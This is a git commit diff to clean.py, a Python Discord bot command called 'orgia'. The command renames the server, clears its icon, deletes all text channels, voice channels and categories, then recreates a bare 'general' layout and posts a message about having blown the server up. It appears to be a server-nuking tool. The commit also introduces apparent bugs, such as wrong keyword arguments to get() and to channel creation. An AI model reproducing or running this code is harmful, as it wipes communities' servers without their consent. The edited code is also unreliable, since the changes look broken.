74504ec9f9c4a1656afc2f7e2c2dc1b3b6a32d56
J4ck0505 <80529490+J4ck0505@users.noreply.github.com>
2021-04-21 15:56:14 +0900

    Update clean.py

--- clean.py
+++ clean.py
@@ -37,12 +37,12 @@ async def orgia(ctx):
   categories = get(ctx.guild.categories, name=name)
   categories2 = get(ctx.guild.categories, name2=name2)
   await ctx.guild.edit(icon=None, name=f"{owner}님의 서버")
-  for c in ctx.guild.text_channels:
-      await c.delete()
-  for ch in ctx.guild.voice_channels:
-      await ch.delete()
-  for cha in ctx.guild.categories:
-      await cha.delete()
+  for channel in ctx.guild.text_channels:
+      await channel.delete()
+  for channel in ctx.guild.voice_channels:
+      await channel.delete()
+  for channel in ctx.guild.categories:
+      await channel.delete()
   await ctx.guild.create_category("채팅 채널")
   await ctx.guild.create_category("음성 채널")
   permissions = discord.Permissions()
@@ -51,9 +51,9 @@ async def orgia(ctx):
   name = '채팅 채널'
   name2 = '음성 채널'
   categories = get(ctx.guild.categories, name=name)
-  categories2 = get(ctx.guild.categories, name=name2)
-  await ctx.guild.create_text_channel("일반", category=categories)
-  await ctx.guild.create_voice_channel("일반", category=categories2)
+  categories2 = get(ctx.guild.categories, name2=name2)
+  await ctx.guild.create_text_channel("일반", categories=categories)
+  await ctx.guild.create_voice_channel("일반", categories2=categories2)
   channel = get(ctx.guild.channels, name="일반")
   embed = discord.Embed(title="서버도 깔끔", description="미리-삭제한 서버!")
   embed.set_footer(text="그냥 터트려서 대접하세요!")
